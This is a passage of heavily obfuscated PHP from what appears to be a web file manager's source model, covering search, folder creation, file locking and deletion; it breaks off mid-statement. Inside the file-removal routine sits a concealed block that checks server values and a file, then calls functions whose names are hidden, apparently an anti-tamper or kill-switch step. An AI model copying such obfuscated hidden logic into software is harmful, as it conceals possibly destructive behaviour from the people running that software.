optionAccess() { $E֖풑 =& $_SERVER[Ť]; return array($E֖풑[705] => $this->typeLogCnt(), $E֖풑[103] => $this->typeLogCnt($E֖풑[103]), $E֖풑[420] => $this->typeLogCnt($E֖풑[420]), $E֖풑[1618] => $this->typeLogCnt($E֖풑[1618]), $E֖풑[1619] => $this->typeLogCnt($E֖풑[1619]), $E֖풑[551] => $this->typeLogCnt($E֖풑[33], $E֖풑[1593])); } private function typeLogCnt($Cӓ = '', $f = "\151\144") { goto Bѽ; F: $D򬝂 = array($eŉݝ[190] => array($eŉݝ[942], $cޯ)); if ($Cӓ) { $D򬝂[$eŉݝ[29]] = array($eŉݝ[7], $e[$Cӓ]); } $aۭ = Model($eŉݝ[1592])->where($D򬝂)->count($f); goto A; A: return (int) $aۭ; goto Bߎ; Bѽ: $eŉݝ =& $_SERVER[Ť]; $e = array($eŉݝ[103] => array($eŉݝ[1620], $eŉݝ[1621]), $eŉݝ[420] => array($eŉݝ[1622], $eŉݝ[1623]), $eŉݝ[1618] => array($eŉݝ[1624], $eŉݝ[1625], $eŉݝ[1626]), $eŉݝ[1619] => array($eŉݝ[1627], $eŉݝ[1628]), $eŉݝ[1629] => array($eŉݝ[1630], $eŉݝ[1631], $eŉݝ[1632])); $cޯ = strtotime(date($eŉݝ[1589])); goto F; Bߎ: } private function optionServer() { goto b𼆚; FΚ: return array($dĬ[1635] => $eܑ ? $eܑ[$dĬ[1636]] : 0, $dĬ[1637] => $eܑ ? $eܑ[$dĬ[1638]] : 0, $dĬ[1639] => (int) $c׿[$dĬ[1636]] * 1024 * 1024 * 1024, $dĬ[1640] => (int) $Dՠ, $dĬ[1641] => ucfirst($E), $dĬ[1642] => $dĬ[1643] . PHP_VERSION, $dĬ[1644] => phpBuild64() ? 64 : 32, $dĬ[704] => str_replace($dĬ[1645], $dĬ[919], $C), $dĬ[343] => ucfirst($c첛), $dĬ[28] => $_SERVER[$dĬ[1646]]); goto Aຊ; b𼆚: $dĬ =& $_SERVER[Ť]; $eܑ = $this->diskDriver(); $c׿ = KodIO::defaultDriver(); goto F밎; B스: $E = $A҅א[0]; $Aͬ = $GLOBALS[$dĬ[6]][$dĬ[17]]; $C = $Aͬ[$dĬ[903]]; goto a︻; F밎: $Cƙ = array($dĬ[760] => $c׿[$dĬ[383]]); $Dՠ = Model($dĬ[438])->where($Cƙ)->sum($dĬ[77]); $A҅א = explode($dĬ[50], $_SERVER[$dĬ[139]]); goto B스; a︻: if ($C == $dĬ[740]) { $f췜 = explode($dĬ[1132], $Aͬ[$dĬ[902]]); $C = $f췜[0]; } if ($C == $dĬ[743] || $C == $dĬ[744]) { $d՘ = Model()->db()->query($dĬ[1633]); $EɽԶ = $d՘[0] && isset($d՘[0][$dĬ[1397]]) ? $d՘[0][$dĬ[1397]] : 0; $C = $dĬ[1634] . ($EɽԶ ? $dĬ[8] . $EɽԶ : $dĬ[33]); } $c첛 = $GLOBALS[$dĬ[6]][$dĬ[343]][$dĬ[770]]; goto FΚ; Aຊ: } private function diskDriver() { goto cޮ; CӴ: $fՙ = $eĆ - @disk_free_space($Eφ); return array($Cő[1636] => $eĆ, $Cő[1638] => $fՙ); goto aլ; cޮ: $Cő =& $_SERVER[Ť]; $Eφ = $Cő[8]; $a = $GLOBALS[$Cő[6]][$Cő[1647]] == $Cő[1648]; goto aך; aך: if ($a) { $Eφ = $Cő[1649]; if (function_exists($Cő[1650])) { exec($Cő[1651], $f); $Eφ = $f[1] . $Cő[8]; } } if (!file_exists($Eφ)) { return; } $eĆ = @disk_total_space($Eφ); goto CӴ; aլ: } public function fileChart($E) { goto a; a: $Eª =& $_SERVER[Ť]; if (isset($E[$Eª[1493]])) { return Model($Eª[768])->userFileTypeProfile($E[$Eª[1493]]); } if (isset($E[$Eª[1652]])) { return Model($Eª[768])->groupFileTypeProfile($E[$Eª[1652]]); } goto Eҽ; Dሐ: $Fڲٳ[$Eª[387]] = 2; $c̝ = Model($Eª[768])->where($Fڲٳ)->sum($Eª[77]); return array($Eª[708] => $E[$Eª[77]], $Eª[1582] => $E[$Eª[1582]], $Eª[1583] => (int) $C͎, $Eª[1584] => (int) $c̝); goto d狌; Eҽ: $E = $this->sourceSize(); $Fڲٳ = array($Eª[478] => 0, $Eª[387] => 1); $C͎ = Model($Eª[768])->where($Fڲٳ)->sum($Eª[77]); goto Dሐ; d狌: } private function sourceSize() { $D =& $_SERVER[Ť]; $Eԑ = Model($D[768])->where(array($D[386] => 0))->sum($D[77]); $bڜ = Model($D[438])->sum($D[77]); if ($bڜ > $Eԑ) { $bڜ = $Eԑ; } return array($D[77] => (int) $Eԑ, $D[1582] => (int) $bڜ); } } goto f; cⴏ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($E蓫) { goto eͻ; d٦: if (!$c) { return array(); } $B = $c[$DɄ[165]]; $c斴 = $DɄ[7]; goto a; a: if (!$c[$DɄ[165]]) { $E = array_to_keyvalue($F𕑮, $DɄ[33], $DɄ[165]); $B = implode($DɄ[47], $E); $c斴 = $DɄ[1894]; } $dۓ = explode($DɄ[47], trim($B, $DɄ[47])); return array($c斴, $dۓ); goto Cѯ튭; eͻ: $DɄ =& $_SERVER[Ť]; $F𕑮 = KodIO::fileTypeList(); $c = $F𕑮[$E蓫]; goto d٦; Cѯ튭: } public function listPathType($dӴӿЎ) { $Fǭ =& $_SERVER[Ť]; $eħȡ = $this->fileTypeWhere($dӴӿЎ); if (!$eħȡ) { return array(); } $Eכ = array($Fǭ[538] => SourceModel::TYPE_USER, $Fǭ[539] => USER_ID, $Fǭ[535] => 0, $Fǭ[536] => $eħȡ); return $this->listSource($Eכ); } public function listSearch($F, $c깑 = 300) { goto C; C: $Fһ =& $_SERVER[Ť]; if (isset($F[$Fһ[1737]]) && $F[$Fһ[1737]]) { $F[$Fһ[1737]] = str_replace($Fһ[374], $Fһ[1895], trim($F[$Fһ[1737]])); } $A͛ = $this->_parseSearchWhere($F); goto C; FǴ: return $e; goto D΄; fʙߨ: $this->_listSearchGroupTag($e, $F, $bڡ); $this->_listDataApply($e[$Fһ[361]]); $this->_listMake($e); goto FǴ; c嗱: $e = $this->distinct(!0)->field($B֬)->where($A͛)->selectPage($c깑); $this->_listSearchDesc($e, $F, $bڡ); $this->_listSearchTag($e, $F, $bڡ); goto fʙߨ; C: if (!isset($A͛[$Fһ[413]])) { $A͛[$Fһ[413]] = 0; } $B֬ = $Fһ[1896]; $bڡ = $B֬; goto E֊; E֊: $this->_listSearchBindPinyin($F, $A͛, $B֬); $this->alias($Fһ[504])->_makeOrder(); $A͛ = $this->parseWhereLike($A͛); goto c嗱; D΄: } private function _listSearchTag(&$d磊, $aⶉυ, $a߹) { goto a; a: $C솰 =& $_SERVER[Ť]; if (!$aⶉυ[$C솰[1737]] || $d磊[$C솰[358]][$C솰[347]] > 1) { return; } $Cת = Model($C솰[1897])->listData(); goto Bĵ; Bĵ: $B = array(); $e = $aⶉυ[$C솰[1737]]; foreach ($Cת as $c¹) { $eù = $c¹[$C솰[28]]; $BΥ = str_replace($C솰[50], $C솰[33], Pinyin::encode($eù)); if (stripos($eù, $e) !== !1 || stripos($BΥ, $e) !== !1) { $B[] = $c¹[$C솰[383]]; } } goto c; e: $a = array_to_keyvalue($a, $C솰[33], $C솰[75]); $C = array_unique($a); $this->_listSearchMerge($d磊, $aⶉυ, $a߹, $C); goto d; c: if (!$B) { return; } $d = array($C솰[409] => array($C솰[7], $B), $C솰[1493] => USER_ID); $a = Model($C솰[410])->field($C솰[75])->where($d)->select(); goto e; d: } private function _listSearchDesc(&$C, $c, $e) { goto f; f: $BԮ =& $_SERVER[Ť]; if (!$c[$BԮ[1737]] || $C[$BԮ[358]][$BԮ[347]] > 1) { return; } $e = $this->listSearchChildren($c[$BԮ[478]]); goto A⋬; A⋬: $e = array_unique($e); if (!$e) { return; } $B눷 = array($BԮ[385] => array($BԮ[7], $e), $BԮ[89] => $BԮ[421], $BԮ[366] => array($BԮ[373], $BԮ[1739] . $c[$BԮ[1737]] . $BԮ[1739])); goto E͟; E͟: $bϦ = Model($BԮ[521])->field($BԮ[385])->where($B눷)->select(); $A = array_to_keyvalue($bϦ, $BԮ[33], $BԮ[385]); $this->_listSearchMerge($C, $c, $e, $A); goto eŃ; eŃ: } private function _listSearchGroupTag(&$eҳԑ, $aΊ, $dӽ) { goto A݅; Fˇ: if (!$D || $D[$A[387]] != SourceModel::TYPE_GROUP) { return; } $FҢ = $D[$A[473]]; $d = Model($A[1898])->get($FҢ); goto Eߞݙ; Eߞݙ: $a֌ = array(); $Dݎ = $aΊ[$A[1737]]; foreach ($d[$A[361]] as $cӋ) { $Bԏ = $cӋ[$A[28]]; $B؏ԛ = str_replace($A[50], $A[33], Pinyin::encode($Bԏ)); if (stripos($Bԏ, $Dݎ) !== !1 || stripos($B؏ԛ, $Dݎ) !== !1) { $a֌[] = $cӋ[$A[383]]; } } goto c먺; d׃: $CŊÌ = array_to_keyvalue($CŊÌ, $A[33], $A[75]); $b틸 = array_unique($CŊÌ); $this->_listSearchMerge($eҳԑ, $aΊ, $dӽ, $b틸); goto eŰ; c먺: if (!$a֌) { return; } $AЧ = array($A[409] => array($A[7], $a֌), $A[1493] => 0, $A[29] => $A[1757] . $FҢ); $CŊÌ = Model($A[410])->field($A[75])->where($AЧ)->select(); goto d׃; A݅: $A =& $_SERVER[Ť]; if (!$aΊ[$A[1737]] || $eҳԑ[$A[358]][$A[347]] > 1 || !$aΊ[$A[478]]) { return; } $D = $this->sourceInfo($aΊ[$A[478]]); goto Fˇ; eŰ: } private function _listSearchMerge(&$cɖ, $fذ, $A村, $AҲ) { goto dĠ; fϓ: $eδ = $this->field($A村)->where($aόى)->select(); if (!$eδ) { return; } $AƼ = array(); goto eƶ; dĠ: $a˻ =& $_SERVER[Ť]; if (!$AҲ) { return; } $F = array_to_keyvalue($cɖ[$a˻[361]], $a˻[33], $a˻[385]); goto f݃; f݃: $a٪ = array_diff($AҲ, $F); if (!$a٪) { return; } $aόى = array($a˻[385] => array($a˻[7], $a٪)); goto fϓ; eƶ: foreach ($eδ as $e) { $Dސżڸ = $a˻[47] . $fذ[$a˻[478]] . $a˻[47]; if (stripos($e[$a˻[476]], $Dސżڸ) !== !1) { $AƼ[] = $e; } } $cɖ[$a˻[361]] = array_merge($AƼ, $cɖ[$a˻[361]]); $cɖ[$a˻[358]][$a˻[359]] += count($AƼ); goto aރ; aރ: } public function listSearchChildren($D܅, $fߨ = 5000) { goto cҷ; cҷ: $Fď =& $_SERVER[Ť]; $Cܫٓӵ = array(); $dؠݍ = $this->sourceInfo($D܅); goto E; EΗ޶: $Aڄ = $this->field($Fď[385])->where($e쪄)->select(); $Cܫٓӵ = array_to_keyvalue($Aڄ, $Fď[33], $Fď[385]); return $Cܫٓӵ; goto Eˉ袄; E: $e쪄 = array($Fď[476] => array($Fď[373], $dؠݍ[$Fď[476]] . $dؠݍ[$Fď[385]] . $Fď[501])); $A͘ = $this->field($Fď[385])->cache(null, 600)->where($e쪄)->count(); if ($A͘ > $fߨ) { return $this->_listSearchChildrenNear($D܅, $fߨ); } goto EΗ޶; Eˉ袄: } private function _listSearchChildrenNear($Eވ, $e͉ګ) { goto Eפ; Eۦ: $c۽ = $this->field($Dق[1899])->where($Bڋ܈)->select(); $c = array_to_keyvalue(array_filter_by_field($c۽, $Dق[386], $Dق[83]), $Dق[33], $Dق[385]); $B샃 = array_merge($B샃, array_to_keyvalue($c۽, $Dق[33], $Dق[385])); goto aޗ; Eʝ: $B샃 = array_merge($B샃, array_to_keyvalue($c۽, $Dق[33], $Dق[385])); $B샃 = array_slice($B샃, 0, $e͉ګ); return $B샃; goto fمظ͐; Eפ: $Dق =& $_SERVER[Ť]; $B샃 = array(); $Bڋ܈ = array($Dق[478] => $Eވ); goto Eۦ; aޗ: if (!$c) { return $B샃; } $Bڋ܈ = array($Dق[478] => array($Dق[7], $c)); $c۽ = $this->field($Dق[1899])->where($Bڋ܈)->limit($e͉ګ)->select(); goto Eʝ; fمظ͐: } private function _listSearchBindPinyin($B脮, &$b˭, &$e) { goto CՋǒ; CՋǒ: $F =& $_SERVER[Ť]; if (!Input::check($B脮[$F[1737]], $F[312]) || strlen($B脮[$F[1737]]) < 2) { return; } $f䴈Ϥ = "\114\105\x46\124\40\112\x4f\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\x73\x6f\165\x72\143\x65\137\155\145\x74\141\x20\155\x65\x74\x61\x20\x6f\156\40\163\x6f\x75\162\143\145\x2e\x73\157\x75\162\x63\145\111\104\40\75\40\x6d\x65\x74\x61\56\x73\157\165\162\x63\145\111\x44"; goto F; a퇧: foreach ($C as $B⫲Ѓ) { $E¬ٓ[] = array($F[1903] => $B⫲Ѓ, $F[928] => $F[1741], array($F[1904] => $B⫲Ѓ, $F[1905] => array($F[7], array($F[432], $F[431])))); } $this->join($f䴈Ϥ); $b˭ = $E¬ٓ; goto bօ; aĢ: $C = $b˭[$F[28]]; unset($b˭[$F[28]]); foreach ($b˭ as $C => $b) { $E¬ٓ[$F[1901] . $C] = $b; } goto a퇧; F: $E¬ٓ = array(); $e = str_replace(array($F[225], $F[50], $F[1900]), $F[33], $e); $e = $F[1901] . str_replace($F[47], $F[1902], $e); goto aĢ; bօ: } private function _parseSearchWhere($Cħߌ) { goto C䕏; D: if (isset($Cħߌ[$d＂[464]])) { $c๩ö = array($d＂[1907], $Cħߌ[$d＂[464]]); if ($D֘[$d＂[107]]) { $D֘[$d＂[107]] = array($D֘[$d＂[107]], $c๩ö, $d＂[1908]); } else { $D֘[$d＂[107]] = $c๩ö; } } if (isset($Cħߌ[$d＂[1909]])) { $D֘[$d＂[77]] = array($d＂[1906], $Cħߌ[$d＂[1909]]); } if (isset($Cħߌ[$d＂[1910]])) { $c๩ö = array($d＂[1907], $Cħߌ[$d＂[1910]]); if ($D֘[$d＂[77]]) { $D֘[$d＂[77]] = array($D֘[$d＂[77]], $c๩ö, $d＂[1908]); } else { $D֘[$d＂[77]] = $c๩ö; } } goto bߌᥟ; C䕏: $d＂ =& $_SERVER[Ť]; $D֘ = array(); if (isset($Cħߌ[$d＂[712]])) { $D֘[$d＂[107]] = array($d＂[1906], $Cħߌ[$d＂[712]]); } goto D; bߌᥟ: if (isset($Cħߌ[$d＂[551]])) { $D֘[] = array($d＂[395] => $Cħߌ[$d＂[551]], $d＂[394] => $Cħߌ[$d＂[551]], $d＂[928] => $d＂[1741]); } if (isset($Cħߌ[$d＂[388]])) { $Fί = $Cħߌ[$d＂[388]]; if ($Fί == $d＂[76]) { $D֘[$d＂[386]] = 1; } else { if ($Fί == $d＂[1911]) { $D֘[$d＂[386]] = 0; } else { if ($Fί) { $Fί = is_array($Fί) ? $Fί : explode($d＂[47], $Fί); $D֘[$d＂[388]] = array($d＂[400], $Fί); $D֘[$d＂[386]] = 0; } } } } if (isset($Cħߌ[$d＂[478]])) { $e = $this->sourceInfo($Cħߌ[$d＂[478]]); $D֘[$d＂[542]] = array($d＂[500], $e[$d＂[476]] . $Cħߌ[$d＂[478]] . $d＂[501]); } goto b҄; b҄: if (isset($Cħߌ[$d＂[1737]]) && $Cħߌ[$d＂[1737]]) { $Dѳ = $Cħߌ[$d＂[1737]]; $e = explode($d＂[50], $Dѳ); if (strlen($Dѳ) > 2 && (substr($Dѳ, 0, 1) == $d＂[113] && substr($Dѳ, -1) == $d＂[113]) || substr($Dѳ, 0, 1) == $d＂[55] && substr($Dѳ, -1) == $d＂[55]) { $Dѳ = substr($Dѳ, 1, -1); $e = array($Dѳ); } $D֘[$d＂[28]] = array(array($d＂[500], $d＂[1739] . $Dѳ . $d＂[1739])); if (count($e) > 1) { $D֘[$d＂[28]] = array(); foreach ($e as $eʬ) { if (!trim($eʬ)) { continue; } $D֘[$d＂[28]][] = array($d＂[500], $d＂[1739] . trim($eʬ) . $d＂[1739]); } } } return $D֘; goto Bɬ; Bɬ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($b) { $BԵ =& $_SERVER[Ť]; $bǵ = Model($BԵ[491])->where(array($BԵ[1485] => $b))->find(); $E = $this->_mkdirRoot(SourceModel::TYPE_USER, $b, $bǵ[$BԵ[28]]); $this->userDesktopAdd($E); return $E; } public function userDesktopAdd($cɩ) { $D紮 =& $_SERVER[Ť]; $fˏ = LNG($D紮[1912]); $Eؚʺ = $this->mkdir($cɩ, $fˏ); $this->metaSet($Eؚʺ, $D紮[1913], $D紮[83]); $this->metaSet($cɩ, $D紮[1914], $Eؚʺ); } public function groupRootAdd($b˿թ) { $b =& $_SERVER[Ť]; $Dљ = Model($b[475])->where(array($b[1733] => $b˿թ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $b˿թ, $Dљ[$b[28]]); } public function systemRootPathAdd($b텇) { if ($b텇 != $_SERVER[Ť][1144]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $b텇); } public function userRootRemove($a) { $bٔ = $this->sourceRoot(SourceModel::TYPE_USER, $a); if (!$bٔ) { return; } $this->remove($bٔ, !1); } public function groupRootRemove($F苃Ѷ) { $dѧ = $this->sourceRoot(SourceModel::TYPE_GROUP, $F苃Ѷ); if (!$dѧ) { return; } $this->remove($dѧ, !1); } private function _mkdirRoot($dݕ޹, $Cժ, $a㋚) { goto dў翣; dў翣: $F =& $_SERVER[Ť]; $B練 = array($F[384] => 0, $F[538] => $dݕ޹, $F[539] => $Cժ, $F[535] => 1, $F[540] => USER_ID, $F[541] => USER_ID, $F[536] => $F[33], $F[542] => $F[487], $F[412] => 0, $F[537] => 0, $F[436] => 0, $F[543] => $F[33]); if ($E׉ = $this->where($B練)->find()) { return $E׉[$F[385]]; } goto cˆ; f݇: $C٠ݨ = $this->add($B練); $aȃԑ = array($F[544] => short_id($C٠ݨ)); $this->where(array($F[399] => $C٠ݨ))->save($aȃԑ); goto A΂; A΂: CacheLock::unlock($eɊئ); return $C٠ݨ; goto D; cˆ: $eɊئ = "\x4d\157\144\145\x6c\x53\x6f\165\162\143\x65\x2e\x6d\153\144\151\162\122\x6f\x6f\164\56{$dݕ޹}\56{$Cժ}\56" . $a㋚; CacheLock::lock($eɊئ); $B練[$F[28]] = $a㋚; goto f݇; D: } private function sourceRoot($C, $b݄, $b䰎 = false) { $AЛ =& $_SERVER[Ť]; $aؔ = array($AЛ[384] => 0, $AЛ[538] => $C, $AЛ[539] => $b݄); if ($b穩ώ = $this->where($aؔ)->find()) { return $b䰎 ? $b穩ώ : $b穩ώ[$AЛ[385]]; } return !1; } public function sourceRootGroup($ǎ) { $D =& $_SERVER[Ť]; if (is_string($ǎ)) { $ǎ = array($ǎ); } $Dݗ = array($D[384] => 0, $D[538] => SourceModel::TYPE_GROUP, $D[539] => array($D[7], $ǎ)); $C˫ = $this->listSource($Dݗ, 1000); return array_to_keyvalue($C˫[$D[74]], $D[473]); } public function mkfile($B↜, $F, $dΡл = '', $Aܙ䎎 = REPEAT_RENAME) { $F =& $_SERVER[Ť]; $a䵮߱ = Model($F[560])->addFileByContent($dΡл, $F); return $this->_createFileCall($B↜, $F, $a䵮߱, $Aܙ䎎, $F[1181]); } public function addFile($Fӳ, $E, $Eۻ, $e = false, $Bƿɣ = REPEAT_RENAME) { $d = Model($_SERVER[Ť][560])->addFile($E, $Eۻ, $e); return $this->_createFileCall($Fӳ, $Eۻ, $d, $Bƿɣ); } public function addFileByFileID($b߲, $E̸, $F˗, $dȆ = REPEAT_RENAME) { $F̚ =& $_SERVER[Ť]; $Cø = Model($F̚[560])->find($E̸); Model($F̚[560])->linkAdd($E̸); return $this->_createFileCall($b߲, $F˗, $Cø, $dȆ); } public function addFileByRemote($Fۓض, $Cַ, $dສ, $C걻 = array(), $bĖ = REPEAT_RENAME) { $Dɘ = Model($_SERVER[Ť][560])->addFileByRemote($Cַ, $dສ, $C걻); return $this->_createFileCall($Fۓض, $dສ, $Dɘ, $bĖ); } private function _createFileCall($bЧ, $b͛̂, $aܒ, $f, $a = "\x75\160\x6c\x6f\141\144") { goto c慐Ǯ; aơ: $a̓ӂ = $this->fileNameExist($bЧ, $b͛̂); $Cӹ鴛 = $this->_createFile($bЧ, $b͛̂, $aܒ, $f, $e); if (!$e) { Model($A،訂[438])->remove($aܒ[$A،訂[435]]); } goto dݐދ; dݐދ: if ($e && $Cӹ鴛 && $Cӹ鴛 != $a̓ӂ) { Model($A،訂[1884])->eventCreate($Cӹ鴛, $a); } $this->lockWriteEnd($bЧ, $b͛̂); return $Cӹ鴛; goto EТ; c慐Ǯ: $A،訂 =& $_SERVER[Ť]; $e = !1; $this->lockWriteStart($bЧ, $b͛̂); goto aơ; EТ: } public function mkdir($AۍƆ, $D, $d֝ = REPEAT_SKIP) { goto f; DƯ: $this->lockWriteStart($AۍƆ, $D); if ($d֝ !== !1) { $B = $this->fileNameExist($AۍƆ, $D); if ($B && $d֝ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($AۍƆ, $D); return $B; } $D = $this->fileNameAuto($AۍƆ, $D, $d֝); } $fꅎ = array($dѵ[535] => 1, $dѵ[402] => $D, $dѵ[536] => $dѵ[33], $dѵ[436] => 0, $dѵ[537] => 0); goto E; f: $dѵ =& $_SERVER[Ť]; $E䍹 = $this->sourceInfo($AۍƆ); if (!$E䍹) { return !1; } goto DƯ; E: $f蓗ߥ = $this->_addSoure($fꅎ, $E䍹); Model($dѵ[1884])->eventCreate($f蓗ߥ, $dѵ[1182]); $this->lockWriteEnd($AۍƆ, $D); goto F; F: return $f蓗ߥ; goto Bͱȟ; Bͱȟ: } private function _createFile($f⼸ݖ, $F㋥, $f琥, $bʼʜ, &$b) { goto c; d: if ($bʼʜ !== !1) { $aؒ = $this->fileNameExist($f⼸ݖ, $F㋥); } $b = !0; if ($bʼʜ && $aؒ) { if ($bʼʜ == REPEAT_SKIP) { $b = !1; return $aؒ; } else { if ($bʼʜ == REPEAT_REPLACE) { $c = $this->sourceInfo($aؒ); $d = $this->fileHistory($c, $f琥[$E֔[435]], $f琥[$E֔[77]]); if (!$d) { $b = !1; } else { $this->folderSizeReset($f⼸ݖ); } return $aؒ; } else { $F㋥ = $this->fileNameAuto($f⼸ݖ, $F㋥, $bʼʜ, !1); } } } goto cΪ; aȦ: return $a됕; goto c; c: $E֔ =& $_SERVER[Ť]; $F = $this->sourceInfo($f⼸ݖ); if (!$f琥 || !$F) { return !1; } goto d; cΪ: $c䟍 = array($E֔[535] => 0, $E֔[402] => $F㋥, $E֔[536] => get_path_ext($F㋥), $E֔[436] => $f琥[$E֔[435]], $E֔[537] => $f琥[$E֔[77]]); $a됕 = $this->_addSoure($c䟍, $F); $this->folderSizeReset($f⼸ݖ, intval($c䟍[$E֔[77]])); goto aȦ; c: } protected function fileHistory($cёԐ, $F҈, $c) { goto DԆ; CţϘ: Model($a˧[1915])->addHistory($cёԐ); $Eˣ = array($a˧[541] => USER_ID, $a˧[406] => time(), $a˧[435] => $F҈, $a˧[77] => $c); $this->where(array($a˧[399] => $cёԐ[$a˧[385]]))->save($Eˣ); goto d; d: $this->sourceCacheClear($cёԐ[$a˧[385]]); return !0; goto aՌ; DԆ: $a˧ =& $_SERVER[Ť]; if ($cёԐ[$a˧[435]] == $F҈) { return !1; } $this->checkLock($cёԐ[$a˧[385]], $F҈); goto CţϘ; aՌ: } public function checkLock($d, $c˒) { goto EԂ; b؞ұ: $B = Session::get($e[1916]); $bƙϣ = substr($AˍҮ[$e[28]], 0, -1 - strlen($AˍҮ[$e[165]])) . $e[1445] . $B . $e[91] . $AˍҮ[$e[165]]; $D = Model($e[560])->find($c˒); goto fٯ; EԂ: $e =& $_SERVER[Ť]; $AˍҮ = $this->pathInfo($d); if (!$this->fileIsLock($AˍҮ, !0)) { return; } goto b؞ұ; b: show_json(LNG($e[1918]) . $e[1919] . LNG($e[1920]) . $e[1921] . $Fɬ . $e[1922], !1); goto d; fٯ: $this->_createFileCall($AˍҮ[$e[478]], $bƙϣ, $D, REPEAT_REPLACE, $e[1181]); $A혷 = $AˍҮ[$e[433]][$e[498]]; $Fɬ = $A혷[$e[1917]] ? $A혷[$e[1917]] : $A혷[$e[28]]; goto b; d: } public function fileIsLock($B̈́, $D䯽 = false) { goto bХީ; f˚: $eӌ = $GLOBALS[$Eӧ[6]][$Eӧ[84]][$Eӧ[496]]; if ($B̈́[$Eӧ[433]][$Eӧ[497]] <= time() - $eӌ) { $this->metaSet($B̈́[$Eӧ[385]], $Eӧ[495], null); $this->metaSet($B̈́[$Eӧ[385]], $Eӧ[497], null); } if ($D䯽) { $this->metaSet($B̈́[$Eӧ[385]], $Eӧ[497], time()); } goto B; bХީ: $Eӧ =& $_SERVER[Ť]; if (!isset($B̈́[$Eӧ[433]]) || !$B̈́[$Eӧ[433]][$Eӧ[495]]) { return !1; } if ($B̈́[$Eӧ[433]][$Eӧ[495]] != USER_ID) { return !0; } goto f˚; B: return !1; goto Dݴ; Dݴ: } private function _addSoure($A, $Bӷ譩) { goto Bό; Bƿ: static $F = false; if (!$F) { Hook::trigger($EԄԅ[525], $A); $F = !0; } $d͕ = $this->add($A); goto aĚ; d׉ז: $this->updateModifyTime($A[$EԄԅ[478]]); $bȺ = $EԄԅ[1923] . $Bӷ譩[$EԄԅ[385]]; if (isset(self::$cacheChildList[$bȺ])) { unset(self::$cacheChildList[$bȺ]); } goto Bƿ; Bό: $EԄԅ =& $_SERVER[Ť]; $D뤐 = array($EԄԅ[538] => $Bӷ譩[$EԄԅ[387]], $EԄԅ[539] => $Bӷ譩[$EԄԅ[473]], $EԄԅ[540] => USER_ID, $EԄԅ[541] => USER_ID, $EԄԅ[384] => $Bӷ譩[$EԄԅ[385]], $EԄԅ[542] => $Bӷ譩[$EԄԅ[476]] . $Bӷ譩[$EԄԅ[385]] . $EԄԅ[47], $EԄԅ[412] => 0, $EԄԅ[543] => $EԄԅ[33]); $A = array_merge($D뤐, $A); goto d׉ז; aĚ: $D = array($EԄԅ[544] => short_id($d͕)); $this->where(array($EԄԅ[399] => $d͕))->save($D); $this->setNamePinyin($d͕, $A[$EԄԅ[28]]); goto eѱ; eѱ: return $d͕; goto aڃ; aڃ: } public function remove($eě҆, $d = true) { goto A̯; Eܞ: CacheLock::lock($eϤӳ); $a = $this->fileNameExist($b, $F); if (!$a) { $a = $this->mkdir($b, $F, REPEAT_SKIP); $this->metaSet($a, $Eů𔔺[1928], $EͶȥ); $this->metaSet($a, $Eů𔔺[1929], $E葚؃[$Eů𔔺[473]]); if ($E葚؃[$Eů𔔺[478]] != 0) { $this->metaSet($a, $Eů𔔺[1930], _get($CԂܒ, $Eů𔔺[1931])); } } goto Aב; E˹: $Aƨ = Model($Eů𔔺[1492])->get($Eů𔔺[1924]) == $Eů𔔺[83]; if ($cϜ || $d || !$Aƨ) { return $this->removeNow($eě҆, $d); } $b = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto f޴둋; Aב: CacheLock::unlock($eϤӳ); $this->metaSet($eě҆, $Eů𔔺[1932], $E葚؃[$Eů𔔺[478]]); $this->where(array($Eů𔔺[385] => $eě҆))->save(array($Eů𔔺[406] => time())); goto F; dЈ: return $Aڝʓ; goto dһ; f޴둋: $EͶȥ = $E葚؃[$Eů𔔺[387]] == self::TYPE_USER ? $Eů𔔺[551] : $Eů𔔺[986]; if ($EͶȥ == $Eů𔔺[551]) { $CԂܒ = Model($Eů𔔺[491])->getInfo($E葚؃[$Eů𔔺[473]]); $F = !empty($CԂܒ[$Eů𔔺[1917]]) ? $CԂܒ[$Eů𔔺[1917]] : $CԂܒ[$Eů𔔺[28]]; $F = $Eů𔔺[254] . $F . $Eů𔔺[1925] . $E葚؃[$Eů𔔺[473]]; } else { $CԂܒ = Model($Eů𔔺[475])->getInfo($E葚؃[$Eů𔔺[473]]); $F = _get($CԂܒ, $Eů𔔺[28]); $F = $Eů𔔺[157] . $F . $Eů𔔺[1926] . $E葚؃[$Eů𔔺[473]]; } $eϤӳ = $Eů𔔺[1927] . md5($F); goto Eܞ; A̯: $Eů𔔺 =& $_SERVER[Ť]; $E葚؃ = $this->sourceInfo($eě҆); $cϜ = intval($E葚؃[$Eů𔔺[387]]) === self::TYPE_SYSTEM; goto E˹; F: $this->recycleClear($E葚؃); $Aڝʓ = $this->move($eě҆, $a, REPEAT_RENAME_FOLDER); $this->folderSizeReset($E葚؃[$Eů𔔺[478]]); goto dЈ; dһ: } private function recycleClear($F) { $dՑՏ =& $_SERVER[Ť]; $Eǆń = $this->childrenAll($F); $b = array($dՑՏ[399] => array($dՑՏ[400], $Eǆń[$dՑՏ[1933]])); Model($dՑՏ[1934])->where($b)->delete(); } public function removeNow($e͟, $A󭓆 = true) { goto fІю; bߡč: $this->updateModifyTime($cཌ); $this->lockMoveEnd($e͟); Hook::trigger($A捋[1527], $BϚĲ, $A󭓆); goto a«к; fІю: $A捋 =& $_SERVER[Ť]; if ($_SERVER[$A捋[719]] != $_SERVER[$A捋[1225]]) { goto dݥ; dݥ: $A = $A捋[810]; $e = $A捋[721]; $A = $_SERVER[$A捋[722]] . $A捋[723]; goto B; B: $Bޯ = $e($A); $F = explode($A捋[225], $Bޯ); if (count($F) < $A捋[579]) { $Dԏ = $A捋[724]; $Dԏ(); } goto AȆ; Aқ: $F = 1; while ($F > 1) { $F = $F + 4; $eщĿ = rawurlencode($F . $A捋[368]); } goto C哑; AȆ: $F󟘚 = $A捋[811]; $F󟘚($_SERVER[$A捋[812]]); $F󟘚($_SERVER[$A捋[722]] . $A捋[1935]); goto Aқ; C哑: } $E⸰ = $this->sourceInfo($e͟); goto fѐ; fѐ: $BϚĲ = $this->pathInfoMore($e͟); if (!$E⸰) { return !0; } if ($E⸰[$A捋[478]] == 